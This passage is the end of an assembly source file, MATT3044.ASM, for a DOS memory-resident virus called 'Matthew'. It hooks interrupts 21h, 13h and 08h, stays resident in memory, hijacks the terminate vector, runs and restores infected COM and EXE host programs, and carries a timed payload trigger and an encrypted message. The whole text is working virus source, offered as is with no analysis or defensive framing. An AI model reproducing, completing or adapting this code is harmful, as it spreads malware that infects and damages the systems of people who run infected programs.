    SaveInt21Vector:
          mov     ax,3521h                  ; get and save int 21 vector
          int     21h
          mov     DosIntSegment,es
          mov     DosIntOffset,bx
          ret

    HookInt21:
          mov     ax,2521h                  ; hook int 21
          push    cs
          pop     ds
          mov     dx,offset isDos
          int     21h
          ret

    SaveInt08Vector:
          mov     ax,3508h                  ; get and save int 8 vector
          int     21h
          mov     ClockIntSegment,es
          mov     ClockIntOffset,bx

    assume cs:Matthew, ds:nothing

          mov     Trigger,-16               ; initialize payload trigger
          ret


    HookInt08:
          xor     ax,ax                     ; hook int 8
          mov     es,ax
          mov     es:[(8*4)+2],cs
          mov     ax,offset isClock
          mov     es:[8*4],ax
          ret

    SaveInt13Vector:
          push    es                        ; get and save int 13 vector
          mov     ax,3513h
          int     21h
          mov     DiskIntSegment,es
          mov     DiskIntOffset,bx
          pop     es
          ret

    HookInt13:
          push    es                        ; hook int 13
          xor     ax,ax
          mov     es,ax
          mov     es:[(13h*4)+2],cs
          mov     ax,offset isDisk
          mov     es:[13h*4],ax
          pop     es
          ret

    CommandComBuffer    db      12 dup (?),'$'

    GetHostNameInEnvironment:
          mov     es,es:[2ch]               ; get name of host program
          xor     di,di
          cld
          mov     al,0
    IsItStartOfFileName:
          cmp     al,es:[di]
          je      GotStartOfFileName
          nop
          nop
          mov     cx,-1
          repne scasb
          jmp     IsItStartOfFileName
    GotStartOfFileName:
          add     di,3
          mov     HostNameEnvOffset,di
          mov     HostNameEnvSegment,es
          ret

    SetCommandComForExec:
          push    cs              ; decrypt and copy command.com for exec
          pop     ds
          mov     cx,11
          xor     si,si
    DecryptAndCopyCommand:
          mov     ah,ds:[si+offset EncryptedCommandComm]
          not     ah
          mov     ds:[si+offset CommandComBuffer],ah
          inc     si
          loop    DecryptAndCopyCommand
          mov     dx,offset CommandComBuffer
          ret

    ReleaseEnvironment:
          push    es                        ; release environment to heap
          mov     es,cs:[2ch]
          mov     ah,49h
          int     21h
          pop     es
          ret

    PrepareForSetUp:
          mov     Psp,es
          call    GetHostNameInEnvironment
          mov     es,Psp
          push    es
          xor     ax,ax
          mov     es,ax

    ;---------------------------------------- check if already resident

          cmp     byte ptr es:MemoryMarkerLoc,87h     ; myself
          je      isMemoryResident
          nop
          nop
          cmp     byte ptr es:MemoryMarkerLoc,78h     ; early version
          je      isMemoryResident
          nop
          nop
          pop     es
          jmp     PrepareToMoveCode

    isMemoryResident:
          pop     es
          jmp     ExecuteHostProgram

    ;---------------------------------------- prepare to go memory resident

    SetUpMatthew:
          mov     ax,es
          cli
          mov     ss,ax
          sub     sp,16
          sti
          mov     ds,HostProgramSegment     ; copy move coder
          mov     si,HostProgramOffset
          mov     di,offset MoveCode
          mov     cx,9
          cld
          repe movsb
          mov     ds,ax
          call    ReleaseEnvironment        ; release environment
          call    InitializeClockCounter    ; initialize timer
          call    ClearPayloadFlag          ; clear payload flag
          call    SaveInt21Vector           ; save int 21
          call    HookInt21                 ; hook int 21
          call    SaveInt13Vector           ; save int 13
          call    HookInt13                 ; hook int 13
          call    SaveInt08Vector           ; save int 8
          call    HookInt08                 ; hook int 8
          call    MakeDecryptedCopyOfMessage ;create fresh copy of text
          push    cs
          pop     es
          push    cs
          pop     ds
          mov     ax,es:[2ch]               ; save segment of environment
          mov     Environment,ax
          mov     si,0ah                    ; save terminate vector (int 22)
          mov     di,offset EndVirusCode
          mov     cx,6
          cld
          repe movsw
          mov     bx,offset isTerminate     ; set virus terminate routine
          mov     es:[0ah],bx
          mov     es:[0ch],cs
          mov     dx,offset EndVirusCode
          mov     ah,4dh
          call    UseDos                    ; what for?
          mov     cx,4
          shr     dx,cl
          add     dx,30h
          mov     ah,31h
          call    UseDos                    ; tsr
    isTerminate:
          call    SetMemoryMark             ; st memory selfrec
          push    cs
          push    cs
          pop     ds
          mov     es,Psp
          mov     si,offset EndVirusCode    ; restore terminate vector
          mov     di,0ah
          mov     cx,6
          cld
          repe movsw
          pop     es
          mov     ax,Psp
          mov     si,ExecParam              ; set-up exec param
          mov     [si+4],ax
          mov     word ptr [si+2],80h
          mov     [si+8],ax
          mov     word ptr [si+6],5ch
          mov     [si+12],ax
          mov     word ptr [si+10],6ch
          mov     ax,Environment
          mov     [si],ax
          mov     ah,30h                    ; get dos version
          int     21h
          mov     DosVersion,al
          cli
          mov     ExeSs,ss
          mov     ExeSp,sp
          sti
          mov     ds,HostNameEnvSegment
          mov     dx,HostNameEnvOffset
    ExecuteCommandCom:
          mov     bx,ExecParam
          mov     ax,4b00h                  ; execute host program
          cmp     DosVersion,3
          jb      OldDos
          nop
          nop
          call    UseDos
          jmp     VictimExecuted

    OldDos:
          int     21h
    VictimExecuted:
          jnc     GetReturnCode
          nop
          nop
          cmp     ax,2                      ; if "file not found" error
          jne     GetReturnCode             ; execute command.com
          nop
          nop
          call    SetCommandComForExec
          jmp     ExecuteCommandCom

    GetReturnCode:
          cli
          mov     ss,ExeSs
          mov     sp,ExeSp
          sti
          mov     ah,4dh                    ; get return code
          int     21h
          mov     ah,4ch                    ; terminate
          int     21h

    HostComRestorer:
          mov     cx,ComLength              ; restore host com and execute it
          add     cx,2
          mov     si,offset EndVirusCode
          mov     di,100h
          shr     cx,1
          cld
          repe movsw
          not     word ptr es:[100h]
          mov     bx,100h
          jmp     bx

    ExecuteHostProgram:
          cmp     FileTypeFlag,0
          je      isHostExe
          nop                               ; copy com host restorer to
          nop                               ; somewhere near end of segment
          mov     di,0fde8h
          mov     cx,(ExecuteHostProgram-HostComRestorer)
          mov     si,offset HostComRestorer
          cld
          repe movsb
          mov     bx,0fde8h
          jmp     bx

    isHostExe:
          mov     ax,es                ; set up segment and pointers and
          add     ax,ExeSs             ; execute host exe
          mov     ss,ax
          mov     sp,ExeSp
          mov     ax,es
          add     ax,ExeCs
          mov     HostProgramSegment,ax
          mov     ax,ExeIp
          mov     HostProgramOffset,ax
          clc
          jmp     HostProgram

    PrepareToMoveCode:
          mov     HostProgramSegment,cs
          mov     HostProgramOffset,offset MoveCode
          mov     di,100h
          push    cs
          pop     ds                        ; copy virus to start of segment
          mov     si,offset MatthewEntry    ;   psp:100
          cld
          mov     cx,(offset MoveCode-offset MatthewEntry)
          nop
    MoveCode:
          nop
          repe movsb
          push    es
          mov     ax,offset SetUpMatthew
          push    ax
          retf

    ;---------------------------------------- host com code starts here

    EndVirusCode:
          db     32h,0dfh            ;cd 20

    Matthew ends

         end MatthewEntry

   ; ÄÄ MATT3044.ASM ENDS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
